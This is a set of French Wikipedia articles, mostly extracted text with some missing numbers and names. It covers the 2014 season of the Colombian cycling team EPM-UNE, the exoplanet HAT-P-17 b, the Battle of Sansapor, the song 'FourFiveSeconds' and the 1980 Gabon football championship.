Début juillet, la ' n'infirme pas l'impression des premiers mois de compétition. Óscar Sevilla, le leader de l'équipe "EPM-UNE-Área Metropolitana" domine toujours les courses à étapes du calendrier national. Deuxième de la ' (un contre-la-montre en côte) du premier jour, le Colombo-espagnol prend la tête de l'épreuve, le lendemain, en terminant dans le même temps que Mauricio Ortega, au sommet de l", où Sevilla ne lui dispute pas la victoire. Le samedi 5, non seulement, il s'impose au classement général individuel mais il remporte la dernière étape, disputée en critérium et les quatre classements annexes de l'épreuve ; sa formation remportant, quant à elle, le classement par équipes.
Cependant, il n'en va pas de même une semaine plus tard à la ". Óscar Sevilla est absent des débats lors de la première journée, l'éloignant de la victoire finale. Même s'il redevient protagoniste sur les deux dernières étapes, remportant le contre-la-montre, du dernier jour, il échoue à la onzième place finale. Un seul homme termine dans les dix premiers, Walter Pedraza à la cinquième place.
Début août, le Tour de Colombie est l'épreuve suivante à laquelle participe l'équipe. C'est aussi la plus importante du calendrier national et la seule compétition de l'UCI America Tour 2014 en Colombie. L'objectif de la formation est de conserver le titre acquis l'année précédente par Óscar Sevilla. Ce dernier est le favori pour les médias et bon nombre de ses adversaires.
La première étape se dispute sous la forme d'un contre-la-montre par équipes. Les "EPM-UNE-Área Metropolitana" sont en tête à tous les pointages intermédiaires. Sous une pluie battante, ils sont les seuls à boucler le parcours en moins de trente-cinq minutes. Ils relèguent leurs poursuivants immédiats, les "Movistar Team América" à . Camilo Castiblanco franchit la ligne en premier et endosse le premier maillot de leader de l'épreuve. Son coéquipier Weimar Roldán dispose du champion national Miguel Ángel Rubiano, à l'issue d'une échappée menée lors de la troisième étape. Rubiano prend les commandes de la course, Óscar Sevilla se retrouve, alors à du leader. Aidé de sa formation, il tente chaque jour de refaire son retard. Ainsi il remporte la cinquième étape, en mettant à profit sa connaissance du tracé de l'ultime kilomètre. Mais au matin de la "", la veille de l'arrivée, il compte encore de retard sur Rubiano. Lors de ce contre-la-montre en côte, Sevilla prend rapidement le dessus sur le leader provisoire. Trop confiant, il néglige la performance de Fernando Camargo et relâche son effort. Son temps est convenable pour éloigner la menace Rubiano mais pas celle que constitue Camargo. Sevilla se retrouve deuxième de l'épreuve à deux secondes du fauteuil de leader. Lors de la dernière étape, disputée en critérium, les "EPM-UNE-Área Metropolitana" réussissent à grappiller les trois secondes suffisantes pour renverser une situation qui semblait bien compromise. C'est ainsi que dans la suspicion, Óscar Sevilla se succède à lui-même au palmarès du Tour de Colombie, (d'aucuns se sont interrogés sur la passivité des "Boyacá se Atreve - Liciboy", lors du premier sprint bonification, où Sevilla rafle les trois secondes nécessaires et sur l'air enjoué de Fernando Camargo, sur le podium, alors qu'il vient de perdre son Tour national pour une malheureuse seconde).
Outre la victoire dans le classement général individuel, Sevilla s'impose dans le classement par points et Walter Pedraza est consacré meilleur grimpeur de l'épreuve. Tandis que la formation termine deuxième au classement par équipes, un deuxième membre de celle-ci, Juan Pablo Suárez, s'immisce dans le " final.
Une semaine plus tard, l'équipe se scinde en deux pour participer à deux épreuves de front. Six coureurs s'envolent pour le Brésil pour disputer le Tour de Rio et tenter de garder le titre, acquis en par Óscar Sevilla. Il est accompagné de cinq équipiers ayant tous participé à leur Tour national. Pendant qu'une autre partie de l'effectif, emmenée par Walter Pedraza, part à Bucaramanga disputer une course du calendrier domestique, la ".
Dans le pays frontalier, Óscar Sevilla conserve son titre et par là même, remporte sa seconde course à étapes de l'UCI America Tour 2014 dans le mois. Il prend le commandement de la compétition dès le premier jour, où il met à profit la dernière ascension de la journée, pour s'échapper avec son dauphin de l'année précédente et récent vainqueur du Tour du Portugal, Gustavo César Veloso. Les cinq autres équipiers se classent tous dans les quinze premiers, en terminant dans le peloton à du Colombo-espagnol. L'hégémonie sur la course des "EPM-UNE" est remise en cause lors de la quatrième étape, où l'équipe Ironage-Colner lance une échappée matinale, qui obtient jusqu'à d'écart maximal. Le travail des équipiers de Sevilla lui permet de conserver son bien mais éloignent ces derniers au classement général. Lors des deux ultimes étapes, Óscar Sevilla n'est plus inquiété grâce à la vigilance de ses coéquipiers et s'impose devant Veloso. Tandis que la formation termine troisième au classement par équipes, Juan Pablo Suárez, au moyen des bonifications et des cassures dans le peloton, se glisse à la septième place finale.
Au même moment, en l'absence des deux derniers vainqueur de l'épreuve, Alex Cano et Mauricio Ortega, et de leur équipe "Aguardiente Antioqueño", Pedraza livre un duel homérique avec Félix Cárdenas pour le titre. Walter Pedraza s'impose de dix secondes face à son rival, après le contre-la-montre de clôture, où Cárdenas échoue à renverser la situation (Pedraza obtenant en outre le classement de la régularité). Walter prend la tête de la compétition dès la première étape. Il s'y impose avec trois secondes d'avance sur un petit groupe emmené par Cárdenas. Le " perd le commandement de l'épreuve lors du troisième jour, après une échappée au long cours. Mais il le récupère dès le lendemain, dans l'étape reine. Walter Pedraza y signe une deuxième victoire d'étape, en s'isolant à douze kilomètres du terme.
Début septembre, la course suivante emmène les coureurs de la formation à Bello, dans le département d'Antioquia. En l'absence de leur leader, Óscar Sevilla, ses coéquipiers paraissent, dans un premier temps, compétitif. Puisque, le premier jour, Edwin Carvajal prend la tête du classement général, en s'imposant devant Mauricio Ardila. Et que le lendemain, Juan Pablo Suárez gagne devant un groupe réduit. À cette occasion, Suárez remporte la vingt-cinquième victoire d'étapes de la saison, pour sa formation. Cependant, Carvajal cède devant Ardila, lors du contre-la-montre en côte, du quatrième jour, qui s'avère décisif. Le jour suivant voit Mauricio Ardila s'imposer dans la " et la mise en échec de l'équipe. Juan Pablo Suárez termine premier d'entre eux à la cinquième place devant Walter Pedraza, sixième. En sus des deux victoires d'étapes, un classement annexe, celui de la régularité (conquis par Suárez) vient enjoliver le bilan.
Après avoir fait l'impasse sur la ', six coureurs de la formation participe à la '. Sans ses meilleurs éléments, les "EPM-UNE" sont dominés par l'équipe "Aguardiente Antioqueño". Trois des leurs terminent dans les dix premiers mais le mieux classé est Robigzon Oyola, quatrième. Ils ne peuvent empêcher Rafael Montiel de conserver son titre. Le seul satisfecit est la victoire de Weimar Roldán dans le classement des étapes volantes.
Fin septembre, l'équipe se présente à la cinquante-quatrième édition du Clásico RCN, avec l'étiquette de grandissime favori pour son leader Óscar Sevilla, auréolé de sa récente victoire dans le Tour de Rio.
Les cinq premières étapes se disputent en plaine, sous de fortes chaleurs, l'équipe y justifie son statut. Jaime Castañeda s'impose au sprint le premier jour. Óscar Sevilla en fait de même, le surlendemain, à Barranquilla. Castañeda y retrouve, alors, son maillot de leader, qu'il conserve trois jours durant. Par contre, il n'en va pas de même à l'arrivée de la haute montagne. D'abord, Óscar Sevilla et les autres chefs de file des formations rivales sont piégés par le futur vainqueur Óscar Soliz. Sevilla se retrouve deuxième mais à une minute du Bolivien. Pire lors de la huitième étape, il ne peut suivre les candidats au titre et se retrouve irrémédiablement distancé. Il termine sixième de l'épreuve, deux jours plus tard.
Malgré deux victoires d'étapes, le classement de la régularité (remporté par Jaime Castañeda) et le classement combiné pour Óscar Sevilla, la troisième place de la formation dans le classement par équipes et surtout la sixième place de son leader sont des revers pour les "EPM-UNE".
Fin octobre, la formation dispute son ultime compétition au Guatemala, en participant au , sous les couleurs d'EEGSA (fournisseur d'électricité guatémaltèque appartenant au groupe EPM) - Emisoras Unidas. Óscar Sevilla s'impose dans le contre-la-montre inaugural et se maintient en tête de la compétition jusqu'au quatrième jour où Alex Cano le déloge. Malgré le gain de l'étape reine, le lendemain, il ne peut empêcher le Colombien de s'imposer dans l'épreuve. Néanmoins Sevilla termine troisième tandis que deux autres membres de la formation terminent dans les dix premiers, Walter Pedraza au cinquième rang et Juan Pablo Suárez au dixième. Le gain de la dernière étape pour Róbigzon Oyola et deux victoires dans des classements annexes (le trophée des grimpeurs pour Pedraza et le classement par équipes) bonifient le résultat d'ensemble.
Bilan de la saison.
Victoires.
Seules les victoires dans une épreuve reconnue par la fédération internationale sont, ici, comptabilisés.
Classement UCI.
L'équipe EPM-UNE-Área Metropolitana n'étant pas affiliée à l'UCI, ne participe pas à l'UCI America Tour 2014. Cependant individuellement, les résultats des coureurs de la formation, dans les épreuves du circuit continental, sont comptabilisés. Ainsi, Óscar Sevilla termine au deuxième rang et premier d'entre eux.

</doc>
<doc id="8731186" url="https://fr.wikipedia.org/wiki?curid=8731186" title="HAT-P-17 b">
HAT-P-17 b

 est une planète extrasolaire (exoplanète) confirmée en orbite autour de , une étoile de type spectral K, âgée de 7,8 (± 3,3) milliards d'années et située à une distance de du Soleil.
Elle est détectée en 2010, par la méthode des transits.
Avec une masse légèrement supérieure à une demi-masse jovienne () pour un rayon comparable à celui de Jupiter (), il s'agirait d'une planète géante gazeuse de faible masse volumique () comparable à celle de Saturne.

</doc>
<doc id="8731188" url="https://fr.wikipedia.org/wiki?curid=8731188" title="Bataille de Sansapor">
Bataille de Sansapor

La bataille de Sansapor est une bataille de la guerre du Pacifique durant la Seconde Guerre mondiale lors de la campagne de Nouvelle-Guinée.
L'état-major américain visait dans cette opération à la sécurisation de la péninsule de Doberai afin d'y établir des aérodromes en vue de soutenir de futures actions militaires, notamment aux Philippines.
La bataille.
La d'infanterie débarqua en premier lieu sans rencontrer d'opposition dans le nord-ouest de la péninsule sur les îles de Middleburg et d'Amsterdam, mais également sur la péninsule même, sur le Cape Opmarai.
Dès le lendemain, elles débarquèrent plus au sud près de la ville de Sansapor.
L'absence d'opposition s'explique par le fait que la majeure partie de la garnison japonaise était stationnée dans la ville Manokwari, à plus de des sites de débarquements, que le commandement américain a intentionnellement choisi de contourner arguant du fait que sa neutralisation ne revêtait pas à son sens une importance stratégique.
Des unités nippones parvinrent à la mi-août près des zones côtières mais y furent interceptées au cours de combats dont elles sortirent perdantes. Les patrouilles de l'US Army afin de les débusquer durèrent jusqu'au 31 août 1944.
Conséquences.
Dès la mi-août 1944 des aérodromes furent établis et opérationnels sur l'île de Middleburg et près de la ville Mar. Une base d'hydravions fut également mise en place sur l'île d'Amsterdam.
Le reste de la garnison japonaise très isolée et sans ravitaillement, les mers, l'espace aérien et les zones côtières étant sous contrôle américain, passa le reste du conflit retranchée dans la jungle à l'intérieur des terres. Ces troupes, qui furent à partir de ce moment axées avant tout sur leur survie en territoire hostile, furent victimes de la faim et de la maladie et ne représentèrent plus une réelle menace militaire, c'est pourquoi elles furent délibérément ignorées par les Alliés jusqu'à la fin du conflit.

</doc>
<doc id="8731203" url="https://fr.wikipedia.org/wiki?curid=8731203" title="FourFiveSeconds">
FourFiveSeconds

 est une chanson de Rihanna, en collaboration avec Kanye West et Paul McCartney. Elle est sortie le .
Elle a été écrite par Kanye West, Paul McCartney, Kirby Lauryen, Mike Dean, Tyrone Griffin, Dave Longstreth, Dallas Austin, Elon Rutberg et Noah Goldstein. Trois jours après avoir été annoncée, la chanson sort le en format numérique sur les plateformes de téléchargement.
"" est acclamée par la presse musicale, appréciant le minimalisme de la chanson, le changement de cap de Kanye West et de Rihanna, ainsi que leur performance vocale. Dès sa sortie, le single se hisse à la des charts britanniques et du . À l'international, le single atteint la première place en Australie, au Danemark, en Nouvelle-Zélande, en Suède, en Israël, au Luxembourg et en Irlande, et atteint le top 5 en France et au Canada notamment.
Le duo de photographes néerlandais Inez &amp; Vinoodh à New York réalise le vidéoclip de la chanson, en noir et blanc, que les critiques saluent pour sa simplicité. Rihanna, Kanye West et Paul McCartney ont interprété la chanson durant la de au de Los Angeles le . La chanson a été reprise par nombre d'artistes, notamment Drake et l'auteur-compositeur-interprète James Bay.
Genèse et sortie.
Plus de deux ans après la sortie de son dernier album, ' et près d'un an après la sortie de son dernier single, ', Rihanna sort un nouveau titre qui ne figure sur aucun album. Kanye West sort ici une deuxième chanson avec Paul McCartney après '. Quant à Paul McCartney, il sort avec ' son premier single de l'année 2015.
Le , Kanye West fait une apparition surprise au sommet musical organisé par , où il parle de sa carrière, chante quelques chansons et conclut par une collaboration avec Rihanna, « accompagné d'une guitare acoustique et d'un chœur important et puissant, ainsi qu'un massif. Il [Kanye West] a ensuite quitté la scène alors que le public était levé. » Plus tôt, le , le producteur et artiste Ty Dolla Sign annonce lors d'une interview pour "Billboard" que lui, Kanye West, Rihanna et Paul McCartney travaillaient sur une chanson ensemble, qui allait bientôt se finaliser.
Le , Rihanna poste la chanson sur son site officiel, et écrit sur son compte « Premier Aperçu De Ma Nouvelle Musique !!! » ("«  »") La chanson intitulée ' devient disponible en téléchargement digital sur . Le , durant une interview sur le tapis rouge des Grammy Awards, Kanye West explique comment la collaboration s'est déroulée : « Je suis producteur exécutif sur l'album de Rihanna, et je me suis dit que j'allais faire quelques chansons avec Paul McCartney. Elle ne pouvait pas passer à côté de ça. Elle devait l'avoir sur son album... Et maintenant nous sommes aux Grammys, prêts à chanter ensemble. » Il compare ensuite la voix de Rihanna à celle de la chanteuse écossaise Annie Lennox : « Je sens qu'elle a ce type d'énergie dans sa voix. Et elle apporte à la chanson un autre niveau de soul, d'amour et de beauté. » Dans une interview pour "V", Rihanna révèle que ce qui l'a fait tomber amoureuse de ' est la juxtaposition de la musique et des paroles : Bien que ce soit leur première collaboration en trio, West, McCartney et Rihanna ont déjà travaillé ensemble séparément. West et McCartney ont collaboré en 2014 sur la chanson ', chanson dédiée à la fille de Kanye West, . Rihanna et Kanye West ont, quant à eux collaboré en 2009 sur la chanson de Jay-Z ' et en 2011 sur le de Kanye West, "", une chanson où figure également Fergie, John Legend et Elton John. C'est cependant la première collaboration entre Rihanna et McCartney.
"" a été écrite par West, McCartney, Kirby Lauryen, Mike Dean, Ty Dolla Sign, Dave Longstreth, Dallas Austin, Elon Rutberg, Noah Goldstein. Elle a été produite par West et McCartney, co-produite par Dean, avec des productions additionnelles de Longstreth et Goldstein. Le single a été enregistré aux studios à New York City, à Windmark Recording à Santa Monica et aux studios à Mexico. Marcos Tovar ainsi que Goldstein et Dean ont fait l'enregistrement des voix, alors que Brendan Morawski, Zeke Mishanec, Jeremy 'Head' Hartney, Brandon Wood et Jordan Heskett ont servi d'assistants ingénieurs. La production de la voix a été faite par Kuk Harrell et elle a été mixée par Manny Marroquin aux studios à Los Angeles. L'assistant-mixage a été fait par Chris Galland, Jeff Jackson et Ike Schultz. McCartney joue la guitare acoustique, Longstreth l'orgue et Dean la guitare basse. Enfin, le trio Wendy Wilson, Chynna Phillips &amp; Carnie Wilson, autrement connu sous le nom de fait les chœurs durant le pont et le refrain, derrière Rihanna.
Structure et composition des paroles.
' est une chanson pop et « dépouillée » ("«  »") et acoustique teintée de country ("«  »") et de folk d'une durée de trois minutes et huit secondes. ' a une structure instrumentale simple, composée de trois seuls instruments, une guitare acoustique, un orgue, et un violoncelle en arrière-plan. Au lieu d'être rappées, les lignes de West sont chantées, alors que McCartney ne fait que jouer de la guitare. "" a été écrit en clé de ré majeur et en 4/4 sur un tempo de 103 BPM. Les voix de Rihanna et de Kanye West vont du ré3 au ré5.
La chanson commence par quelques accords de la guitare acoustique qui sont très rapidement accompagnés de la voix de Rihanna, démarrant ainsi le premier couplet de la chanson sur huit mesures et d'un pré-refrain de quatre mesures. S'ensuit le premier refrain, toujours avec la voix seule de Rihanna et la guitare de McCartney, sur huit mesures. West entame ensuite son premier couplet, le deuxième de la chanson, sur huit mesures également, suivi alors du deuxième refrain, identique au premier, mais accompagné ici par Kanye West. Commence alors un pont de seize mesures, où Rihanna chante seule avec un orgue en arrière-plan joué par Dave Longstreth. Ensuite, West chante un troisième couplet, avec uniquement la guitare acoustique, sur huit mesures puis est accompagné de Rihanna sur quatre mesures pour le pré-refrain. Le troisième refrain, chanté deux fois, commence alors, avec les trois artistes principaux, Rihanna et West au chant et McCartney à la guitare, il dure alors seize mesures. La chanson se finit sur le contretemps du quatrième temps de la seizième et dernière mesure.
Jocelyn Vena, de , met en évidence la différence du son de la chanson par rapport à celui qu'on retrouve sur son album de 2012, , où l'on retrouve plus de et d'EDM. Hugh McIntyre, du magazine , rejoint Vena sur ce sujet en affirmant que « c'est un changement complet de style pour Rihanna et Kanye West, pas pour Paul McCartney. » Lanre Barkan du qualifie la chanson d'une "ballade acoustique" et s'accorde également sur le fait que la chanson est totalement différente du style de Kanye West et de Rihanna. Alex Franke de Vogue décrit ' comme une version acoustique de la chanson de Rihanna ' sortie en 2011, sans les rythmes présents sur ses singles précédents.
Interprétation des paroles.
La chanson « exprime des émotions allant du tressaillement à la résignation » ("«  »"). Sharan Shetty de affirme que la chanson parle de « crève-cœur et de rédemption » ("«  »") alors que les journalistes de voient plus la chanson comme l'expression de « confusion et de labeur » ("«  »"). Nora Crotty du magazine Elle décrit le single comme une « ode aux regrets matinaux pour les stupides erreurs que l'on a fait la veille au soir. » Jocelyn Vena ajoute qu'une « guitare acoustique qui a du cran » ("«  »") accompagne la voix de Rihanna alors qu'elle chante « / / /  (Je crois que j'en ai assez/je pourrais me saouler/Je dis ce que j'ai en tête/Je pourrais m'amuser un peu/car toute ma gentillesse/est prise pour de la faiblesse»). Ces paroles sont suivies par celles de West : « / / / /  (Je me suis réveillé plein d'optimisme/le soleil brillait/j'étais positif/puis je t'ai entendu dire des obscénités/Retenez moi ou je vais péter les plombs) » Au refrain, West et Rihanna s'harmonisent « / / (Je suis à quatre cinq secondes de partir en vrille, et il ne reste plus que trois jours jusqu'à vendredi/je vais essayer de rentrer à la maison lundi matin/Je jure que je voudrais que quelqu'un me dise/oh c'est tout ce que je veux). »
Réception critique.
' a reçu principalement des critiques positives. Peter Kandunias de ' loue ainsi les voix des deux chanteurs, Kanye West et Rihanna, ainsi que la partie instrumentale de Paul McCartney. Mclntyre de ' dit : « La chanson met en lumière la voix de Rihanna, souvent délaissée dans ses tubes habituellement grandiloquents et pré-faits. » Jim Farber du ' ajoute que cette collaboration est à son goût mieux que la précédente entre McCartney et Kanye West. De plus, il salue la performance vocale de Rihanna et affirme qu'elle est bien meilleure que celle de West, « qui aurait dû utiliser plus d'auto-tune pour accentuer sa voix instable. » Farber ajoute également plus tard : « Cela fait du bien d'entendre Rihanna chanter sans artifices, dans une configuration beaucoup moins travaillée que la plupart de ces autres enregistrements. » Kelsey McKinney de "Vox" note que « la voix de Rihanna montre une amélioration significative dans la tessiture et la tonalité depuis son dernier album. » . Elle ajoute que la performance de Rihanna à l'ouverture de la chanson est « la plus fragile depuis Stay en 2012, et soumet que son prochain album contiendra surement d'autres chansons de ce genre. » 
Spencer Kornhaber de écrit au sujet de la voix de Rihanna : « Entendez ce petit cri aigu et irrégulier dans sa voix au premier couplet, et comment elle garde le contrôle quand elle alterne entre trilles et gospel au moment du pont. » Selon lui, la chanson montre « à quel point son phrasé et son timbre est reconnaissable » ("«  »"), quelque chose qui ne se voyait plus dans ses précédentes chansons comme le single de 2010 '. Travis Grier de pense que la chanson est un bon choix pour Rihanna pour atteindre le statut de légende ; « elle s'est attaquée àà peu près tous les styles musicaux qui puissent exister et " renforce cette idée. » Crotty de "Elle" écrit que la chanson était « incroyable » ("«  »") et « douce » ("«  »"). Pour , la chanson est comparable à des rayons de soleil ("«  »"). Sur , la chanson obtient un 2,3 sur 5 sur la base de 453 notes et se classe à la 193 place des meilleures chansons de l'année en , sur Amazon, elle obtient un 4,5 sur 5 sur 113 critiques. Enfin, sur le site américain d', la chanson est qualifiée d'« à la fois douce et succincte », comme « trois minutes rafraîchissante d'éclat pop. » ' y reçoit une moyenne de 3,5 étoiles sur 5 possibles sur 4981 critiques.
Classements et distinctions.
La chanson est sacrée meilleure collaboration de l'année 2015 durant la cérémonie des American Music Awards. Si un journaliste du "Los Angeles Times" voyait dans "FourFiveSeconds" « une chanson taillée pour plusieurs nominations aux Grammy Awards », la chanson ne fut nommée dans aucune catégorie pour l'édition 2016.
Performance dans les hit-parades.
En Amérique du Nord.
' débute à la du classement américain de après seulement deux jours de radiodiffusion. Selon , cela est dû à la diffusion incessante du single sur les antennes du groupe le . C'est la classée pour Rihanna, alors que c'est première pour Paul McCartney depuis 1992. Pour la semaine du , la chanson débute à la du avec vendus et devient la meilleure entrée de la semaine. Par la suite, il rentre à la douzième place du classement . La semaine suivante, il se place à la du , avec la meilleure progression. De plus, il rentre à la du et à la du de . Dans le , il gagne 39 places pour se hisser à la pour sa deuxième semaine en vendant numériques. Le single devient, pour Paul McCartney, sa chanson la mieux classée depuis 1986 et sa chanson qui se hissa à la septième place. Dans la même semaine, la chanson gagne dix places dans le classement et atteint la deuxième place. Pour sa troisième semaine dans les , la chanson gagne encore des places et se hisse à la sixième place du en vendant . Cela marque la première entrée d'une chanson de McCartney dans top 10 du Hot 100 de depuis 29 ans. Il bat ainsi le record de l'écart le plus important entre deux chansons dans le top 10 du Hot 100, précédemment détenu par Santana, qui avait espacé de 28 ans deux entre 1971 et 1999. Cela devient le de Rihanna dans le top 10 et le de Kanye West. Il atteint également la troisième place du classement et la première du , faisant de cette chanson la quatrième numéro-une du classement pour Rihanna, la septième de Kanye West et la deuxième de McCartney, après son duo avec avec en 1983. Durant la quatrième semaine de la chanson dans les classements du ' Hot 100, la chanson gagne deux places en atteignant la quatrième devenant le premier single de McCartney dans le top 5 depuis 31 ans, après une autre collaboration avec Michael Jackson, en 1983 avec . Au , ' atteint le top 10 du classement , et Rihanna rejoint ainsi Mariah Carey au record du nombre de single dans ce top 10, avec 23 chansons. En , ' a été vendu à million d'exemplaires aux États-Unis.
Au Canada, "" débute à la du à la semaine du . La semaine suivante, la chanson enjambe 56 places et atteint la neuvième place. Une semaine plus tard, elle atteint la quatrième place. La chanson atteint son meilleur classement à la semaine du , à la troisième place. La chanson a atteint la septième place du classement .
Europe et Océanie.
En Australie, ' débute à la des classements de singles à la semaine du . La semaine suivante il se hisse à la troisième place et devient le de Rihanna a entré dans le top 10 du classement. Il rentre également à la deuxième place de l'. Durant la semaine du , la chanson atteint la première place du classement australien, faisant de cette chanson la neuvième de Rihanna à atteindre la première place, la deuxième de West et la troisième de McCartney (post-Beatles). Grâce à cette collaboration, Paul McCartney devient l'artiste le plus âgé, à 72 ans, à se hisser à la première place du classement, record précédemment détenu par Cher qui avait 52 ans quand elle se classa première avec . Durant cette semaine, ' prend également la première place de l'. La chanson a été certifiée triple disque de platine par l'ARIA, avec plus de téléchargements. En Nouvelle-Zélande, la chanson débute à la neuvième place et se place la semaine suivante à la deuxième place, devenant le 31 single de Rihanna a entré dans le top 10 du classement. À la semaine du , la chanson se place en première position et devient la neuvième single numéro-un de Rihanna dans ce classement. Il y reste pendant cinq semaines et est certifiée double disque de platine par le RIANZ après avoir écoulé dans le pays.
Au Royaume-Uni, ' se place à la cinquième position du classement , à la semaine du . La semaine suivante il se hisse à la quatrième place, avec téléchargements. Une semaine, plus tard, il gagne une place de plus et se retrouve à la troisième place. La chanson a été certifiée disque de platine par le BPI et à dater de , la chanson s'y est vendu à . En Écosse, la chanson atteint la deuxième place des . En Irlande, la chanson débute à la quatorzième place du Irish Singles Chart durant la semaine du . Le , durant sa huitième semaine dans le classement, elle atteint la première place. En France la chanson se hisse à la deuxième place et est la troisième chanson la plus vendue du premier trimestre de l'année 2015. En Suède, la chanson se place directement à la première place durant la semaine du , et y reste pour deux semaines. Cela devient la quatrième chanson numéro un pour Rihanna, la deuxième pour Paul McCartney et la première pour Kanye West. Certifiée double disque de platine par le GLF, ' a été vendu à dans le pays. La chanson connaît un succès important dans les autres pays d'Europe continentale et se hisse également à la première place au Danemark et au Luxembourg et dans le top 5 de 18 classements nationaux.
Clip vidéo.
Réalisation.
Le clip a été réalisé par le duo de photographes néerlandais Inez van Lamsweerde et Vinoodh Matadin fin décembre 2014 à New York, déjà connu pour leur collaboration avec Lady Gaga et Madonna notamment. Stephanie Bargas, Jeff Lepine et Jon Barlow sont les producteurs visuels, alors que s'est chargé de la production exécutive. Jodokus Driessen en est le directeur de la photographie et Otto Arsenault, éditeur et cinématographe. Le , Rihanna poste sur sa chaîne une vidéo des coulisses du clip. La vidéo met en scène Rihanna, Paul McCartney et Kanye West dans un décor entièrement blanc. Comme le dit Rihanna dans une interview pour , c'est Kanye West qui a eu cette idée : « Kanye est venue avec l'idée de faire quelque chose d'un style très urbain et américain, à l'image du denim. Le denim, c'est indémodable, c'est classique, c'est iconique, comme les Beatles. » Le , Rihanna poste un extrait du clip sur son compte Instagram. On y voit sa silhouette alors qu'elle chante ; elle porte également une veste . La vidéo sort le lendemain sur compte Vevo officiel sur . Le même jour, la chanson est disponible en téléchargement digital sur l'. Le , la chanson atteint les 100 millions de vues sur , devenant ainsi sa à passer ce cap, faisant de la vidéo une "".
Analyse et critiques.
Selon Kreps du magazine , « le clip noir et blanc style Herb Ritts met en scène Rihanna et West chantant, alors que McCartney joue ses accords sur sa guitare acoustique, et lorsque les trois titans de la musique partagent les mêmes notes, le moment est fort. » Louise Auvitu, du Nouvel Obs, le décrit comme « sobre mais à la pointe de la mode. » « Dans un noir et blanc très sobre, Riri chante dans une veste en jeans trop grande ; Kanye lui donne la réplique avec son flow caractéristique tandis que l'ex-Beatles joue de la guitare, tranquille. C'est beau, direct, sans fioritures. » ajoute Jérôme Vermelin, de . De plus, Feeney note que la vidéo a été tournée en format 1:1, carré, sans rappeler le dernier film du réalisateur canadien Xavier Dolan, .
Un critique de note que le format carré de la vidéo est un écho à la pochette du single, lui aussi de ce format. Sophie Schillaci d" compare le format de la vidéo à celui d'« Instagram » faisant référence au format 1:1 des photos du réseau social. Gregory E. Miller du ' note que la vidéo, minimaliste, est un nouveau départ depuis leurs anciennes vidéo ultra-produites. Journaliste chez VH1, Alexa Tietjen qualifie le visuel du clip « stupéfiant » ("«  »") tout en saluant le look de Rihanna, l'attitude de Kanye West et les talents de McCartney. Dee Locket de "" qualifie le clip d'une « performance vidéo » où Rihanna et West « semblent bientôt s'effondrer» ("« »"). Billy Johnson Jr. de Yahoo! Music affirme que le clip montre Rihanna comme « une femme fragile sur le point de craquer » ("« »"), et continua : « stylistiquement, la vidéo en noir et blanc trouve un juste équilibre entre l'ambiance et le look des deux campagnes publicitaires de Rihanna avec GAP et Abercrombie &amp; Fitch où elle se dénude juste assez pour rendre les censeurs nerveux. » 
Performances sur scène.
Rihanna, Kanye West et Paul McCartney interprètent la chanson en direct durant la des au de Los Angeles le . Devant un écran blanc, les trois artistes apparaissent sur scène en costume simple et sobre. Rihanna porte un costume large et noir tandis que ses cheveux sont plaqués et raides. West porte également un costume noir et McCartney une chemise blanche et une veste de costume pendant qu'il joue de la guitare acoustique. La chanson se termine a cappella avec le public. Chris Payne de ' considère leur performance comme l'une des plus intéressantes de la soirée et salue la prestation vocale de Rihanna : « Soyons réaliste – voir cette improbable collaboration en personne est la principale raison de l'engouement que porte cette chanson. Il y a tellement de manière pour que ces trois personnages puissent ne pas se compléter, mais Rihanna 'Ye et Sir Paul ont su comment la ramener à la vie. » Dans le même article, Joe Lynch place la performance en quatrième position sur toutes les performances de la soirée, ajoutant « ', ironiquement, met du temps à vous saisir, mais la présence des trois grandes stars de la pop sur la scène était l'une des performances la plus délirante de ces . » Julien Goncalves de ChartsinFrance souligne « une prestation en toute simplicité » où « Rihanna a excellé vocalement ». Isabella Biedenharn de "" note la performance d'un « A » tout en louant la performance vocale de Rihanna et Kanye West et leur style vestimentaire. Selon TiVo, leur performance était la cinquième la plus regardée de la cérémonie.
Le , Rihanna s'est produit lors du ' du Championnat NCAA de basket-ball 2015 qui se tenait à Indianapolis. Durant sa performance solo, elle a notamment chanté, ', mais aussi, parmi d'autres, ses dernières chansons comme ' ou '.
Quant à Sir Paul, il la reprend à chacun de ses concerts de sa tournée 2016-2017 "One on One" dans une version beaucoup plus Rock avec un passage a cappella.
Reprises.
Les ont enregistré une reprise de la chanson et ont mis en ligne la vidéo sur leur chaîne . Selon Erin Strecker de Billboard « les sept hommes se sont habilement harmonisés sur des claquements de pieds et mains, rendant la ballade plus calme sans pour autant ôter de sa puissance. » Le rappeur canadien Drake a repris la chanson durant sa performance au se tenant à la à New York le . Le groupe gallois a également repris la chanson, transformant la chanson en un « hymne punk rock. » Également, l'auteur-compositeur-interprète James Bay a repris la chanson durant une performance sur la le . L'ancien participant de Luke Friend a repris la chanson avec une guitare acoustique et a posté un clip de sa reprise sur le . Le sort une vidéo du chanteur australien reprenant ' dans les studios de la radio . Cette version acoustique, Christina Garibaldi de la qualifie de « tout simplement incroyable » ("«  »") et écrit : « le chanteur de ' reprend les paroles Rihanna et de Kanye West avec une facilité déconcertante tout en gardant des traits à la John Mayer. » Rebecca Rose de Cosmopolitan salue également la performance de Cody Simpson, qui selon elle « est un sacrément bon travail », et qui nous averti : « préparez-vous à tomber amoureux. »
Liste des pistes.
Téléchargement numérique
Crédits.
Les crédits sont issus du livret de notes du single ".
Lieux
Personnel

</doc>
<doc id="8731211" url="https://fr.wikipedia.org/wiki?curid=8731211" title="Route du Sel">
Route du Sel



</doc>
<doc id="8731214" url="https://fr.wikipedia.org/wiki?curid=8731214" title="Lips Are Movin">
Lips Are Movin



</doc>
<doc id="8731227" url="https://fr.wikipedia.org/wiki?curid=8731227" title="Saison 6 de New York 911">
Saison 6 de New York 911

Cet article présente le guide des épisodes de la sixième et dernière saison de la série télévisée New York 911 ("").

</doc>
<doc id="8731235" url="https://fr.wikipedia.org/wiki?curid=8731235" title="Championnat du Gabon de football 1980">
Championnat du Gabon de football 1980

La saison 1980 du Championnat du Gabon de football est la quatrième édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les huit clubs issus des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville.
C'est le club de l’USM Libreville qui remporte le titre, après avoir battu le FC 105 Libreville lors de la finale nationale. C'est le tout premier titre de champion du Gabon de l'histoire du club.

</doc>
<doc id="8731249" url="https://fr.wikipedia.org/wiki?curid=8731249" title="Biskupice (Pruszków)">
Biskupice (Pruszków)

